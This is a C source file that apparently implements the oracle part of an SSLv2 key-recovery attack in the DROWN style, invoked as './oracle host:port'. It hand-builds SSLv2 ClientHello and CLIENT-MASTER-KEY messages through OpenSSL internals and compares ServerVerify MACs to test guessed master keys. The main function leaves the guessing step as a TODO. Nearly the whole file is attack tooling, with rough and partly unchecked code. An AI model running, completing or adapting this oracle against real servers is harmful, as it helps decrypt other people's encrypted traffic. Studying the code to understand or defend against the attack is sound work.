#include <assert.h>
#include <openssl/ssl.h>

#include "ssl_locl.h"

/*
 * Writes the message stored in the session buffer
 * to the BIO socket using a 2 byte header
 */
void ssl2_write_to_socket(SSL *s)
{
	unsigned char *buf = (unsigned char *)s->init_buf->data;
	unsigned int len = s->init_num;
	unsigned char *wbuf = (unsigned char *)s->s2->wbuf;

	// We only use two bytes header
	// No idea wtf happens here
	wbuf[0] = (len >> 8) | 0x80;
	wbuf[1] = len & 0xff;

	// Add our message
	memcpy(wbuf + 2, buf, len);

	// Send the message
	BIO_write(s->wbio, (char *)wbuf, len + 2);
}

/*
 * Reads from the BIO socket into the session buffer
 */
void ssl2_read_from_socket(SSL *s)
{
	unsigned char *pos = s->s2->rbuf;

	// Read from BIO socket
	unsigned int n = BIO_read(s->rbio, pos, SSL2_MAX_RECORD_LENGTH_2_BYTE_HEADER);

	// Read length
	// Remove padding
	s->s2->rlength=(((unsigned int)pos[0]) << 8) | ((unsigned int)pos[1]);

	// Check header length
	if ((pos[0] & TWO_BYTE_BIT))
	{
		s->s2->three_byte_header = 0;
		s->s2->rlength &= TWO_BYTE_MASK;
	}
	else
	{
		s->s2->three_byte_header = 1;
		s->s2->rlength &= THREE_BYTE_MASK;
	}
	pos += 2;

	// Read padding if any
	if (s->s2->three_byte_header)
		s->s2->padding = *(pos++);
	else
		s->s2->padding = 0;

	// Adjust fields if cleartext or not
	s->s2->mac_data = pos;
	s->s2->ract_data = pos;
	s->s2->ract_data_length = s->s2->rlength;

	// Separate MAC from actual data
	if (!s->s2->clear_text)
	{
		unsigned int mac_size = EVP_MD_CTX_size(s->read_hash);
		s->s2->ract_data += mac_size;
		s->s2->ract_data_length -= mac_size;
	}
}

/*
 * Sends an empty client handshake HELLO message
 */
void send_client_hello(SSL *s)
{
	unsigned char *buf = (unsigned char*)s->init_buf->data;
	unsigned char *pos = buf;
	unsigned char *data = pos + 9;
	int n;

	// MSG-CLIENT-HELLO message type
	*(pos++) = SSL2_MT_CLIENT_HELLO;

	// Add 2 bytes for SSL version
	s2n(SSL2_VERSION, pos);

	// Add cipher list to message
	// and get the length of the added data
	n = ssl_cipher_list_to_bytes(s, SSL_get_ciphers(s), data, 0);
	data += n;

	// Cipher specs length must be 2 bytes long
	s2n(n, pos);

	// Add 2 bytes for session ID
	s2n(0, pos);

	// Generate our challenge
	n = SSL2_CHALLENGE_LENGTH;
	s->s2->challenge_length = n;
	memset(s->s2->challenge, 0, n);

	// Add 2 bytes for challenge length
	s2n(n, pos);

	// We don't have an actual challenge
	// Fill out the rest of the message with NULL bytes
	memset(data, 0, n);
	data += n;

	// Total message size
	s->init_num = data - buf;

	// Write to socket
	ssl2_write_to_socket(s);
}

/*
 * Checks if the server HELLO message is valid
 */
int recv_server_hello(SSL *s)
{
	unsigned int n;
	unsigned char *pos, *data;

	ssl2_read_from_socket(s);

	pos = s->s2->ract_data;

	// Skip over header
	data = pos + 11;

	// Series of asserts to check if there were no handshake errors

	// Check that message type is MSG-SERVER-HELLO
	assert(*(pos++) == SSL2_MT_SERVER_HELLO);

	// Check session id
	assert(*(pos++) == 0);

	// Check if the certificate type is the one we want
	assert(*(pos++) == SSL2_CT_X509_CERTIFICATE);

	// Get SSL version and remove the padding
	unsigned int server_version;
	n2s(pos, server_version);

	// Check if server runs SSL2
	assert(server_version == SSL2_VERSION);

	// Get certificate length without padding
	n2s(pos, n);

	// We can skip over the certificate
	// because we don't care about it
	data += n;

	// Get cipher length
	n2s(pos, n);

	// Check if any ciphers were selected
	if (n == 0)
		return 0;

	// Get session ciphers
	s->session->cipher = s->method->get_cipher_by_char(data);
	assert(s->session->cipher != NULL);
	data += n;

	// Read connection ID length
	n2s(pos, n);
	s->s2->conn_id_length = n;

	// Read connection ID
	memcpy(s->s2->conn_id, data, n);

	return 1;
}

/*
 * Sends the master key guess to the server
 * master_key -> clear bytes of master key
 * clear_bytes -> number of clear bytes
 * encrypted_key -> encrypted pre master secret
 * encrypted_key_length -> length of the pre master secret
 */
void send_master_key_guess(SSL *s,
			unsigned char *master_key,
			unsigned int clear_bytes,
			unsigned char *encrypted_key,
			unsigned int encrypted_key_length)
{
	unsigned char *buf = (unsigned char *)s->init_buf->data;
	unsigned char *pos, *data;
	unsigned int n;
	const EVP_CIPHER *cipher;
	const EVP_MD *md;

	pos = buf;

	// Skip over header
	data = pos + 10;

	// Get cipher and hash method for the session
	ssl_cipher_get_evp(s->session, &cipher, &md, NULL, NULL, NULL);

	// Message type
	*(pos++) = SSL2_MT_CLIENT_MASTER_KEY;

	// Cipher type selected by server
	n = s->method->put_cipher_by_char(s->session->cipher, pos);
	pos += n;

	// Set required master key length
	s->session->master_key_length = EVP_CIPHER_key_length(cipher);

	// Set master key guess for the session
	memcpy(s->session->master_key, master_key, s->session->master_key_length);

	// Add number of clear bytes
	n = clear_bytes;
	s2n(n, pos);

	// Add clear key bytes
	memcpy(data, master_key, n);
	data += n;

	// Set encrypted key size in header
	n = encrypted_key_length;
	s2n(n, pos);

	// Add the pre master secret to the message
	memcpy(data, encrypted_key, n);
	data += n;

	// Set key IV as 0
	n = EVP_CIPHER_iv_length(cipher);
	s->session->key_arg_length = n;
	memset(s->session->key_arg, 0, n);

	// Set IV length
	s2n(n, pos);

	// Write key IV (only zeros)
	memset(data, 0, n);
	data += n;

	// Total message size
	s->init_num = data - buf;

	// Send message
	ssl2_write_to_socket(s);
}

/*
 * Receives the ServerVerify message from the server
 * and returns 1 if the master key guess was correct
 * or 0 otherwise.
 */
int recv_server_verify(SSL *ssl)
{
	int result;

	// Receive message from server
	ssl2_read_from_socket(ssl);

	// We use some internal SSL functions
	// So we need to set some additional parameters in
	// the SSL object
	ssl->s2->read_sequence = 1;
	ssl->s2->clear_text = 0;

	// Free the old encryption context
	EVP_CIPHER_CTX_free(ssl->enc_write_ctx);
	EVP_CIPHER_CTX_free(ssl->enc_read_ctx);
	ssl->enc_write_ctx = NULL;
	ssl->enc_read_ctx = NULL;

	// We create a new context using the master key guess
	assert(ssl2_enc_init(ssl, 1) == 1);

	// Save a temp copy of the received data
	// because decryption is done in place
	unsigned char *temp = malloc(ssl->s2->rlength);
	memcpy(temp, ssl->s2->mac_data, ssl->s2->rlength);

	// We decrypt the received data with the master key guess
	assert(ssl2_enc(ssl, 0) == 1);

	// Compute the mac of the received data using our key
	unsigned long mac_size = EVP_MD_CTX_size(ssl->read_hash);
	unsigned char *mac = malloc(mac_size);
	ssl2_mac(ssl, mac, 0);

	// If our guess was correct, then the key should match
	// with the one used by the server, so the macs should match
	result = CRYPTO_memcmp(mac, ssl->s2->mac_data, mac_size) == 0;

	// Copy back data
	memcpy(ssl->s2->mac_data, temp, ssl->s2->rlength);

	// Free memory
	free(temp);
	free(mac);

	return result;
}

int main(int argc, char **argv)
{
	int res;

	if (argc < 2)
	{
		printf("Usage: ./oracle host:port\n");
		return -1;
	}

	// Initialize OpenSSL
	SSL_library_init();
	SSL_load_error_strings();

	const SSL_METHOD *method = SSLv2_method();
	assert(method != NULL);

	// Get context
	SSL_CTX *ctx = SSL_CTX_new(method);
	assert(ctx != NULL);

	// Get a new SSL object
	SSL *ssl = SSL_new(ctx);
	assert(ssl != NULL);

	// Connect to SSL server
	BIO *server = BIO_new_connect(argv[1]);
	assert(server != NULL);

	res = BIO_do_connect(server);
	assert(res == 1);

	// Connect SSL with BIO
	SSL_set_bio(ssl, server, server);

	// Make a new SSL session
	// We have to do everything by hand
	ssl_get_new_session(ssl, 0);

	// Set cipers for the session
	// Suppose key len is 16 bytes
	// Found these by using 'openssl ciphers -v -ssl2'
	SSL_set_cipher_list(ssl, "IDEA-CBC-MD5:RC2-CBC-MD5:RC4-MD5");

	// Init socket buffer
	ssl->init_buf = BUF_MEM_new();
	BUF_MEM_grow(ssl->init_buf, SSL2_MAX_RECORD_LENGTH_3_BYTE_HEADER);

	// Start TLS handshake
	send_client_hello(ssl);
	if (!recv_server_hello(ssl))
	{
		printf("Cipher list is not supported\n");
		return -1;
	}

	// TODO add master key guess here
	// Needs encrypted key data in order to work

	SSL_CTX_free(ssl->ctx);
	SSL_free(ssl);

	return 0;
}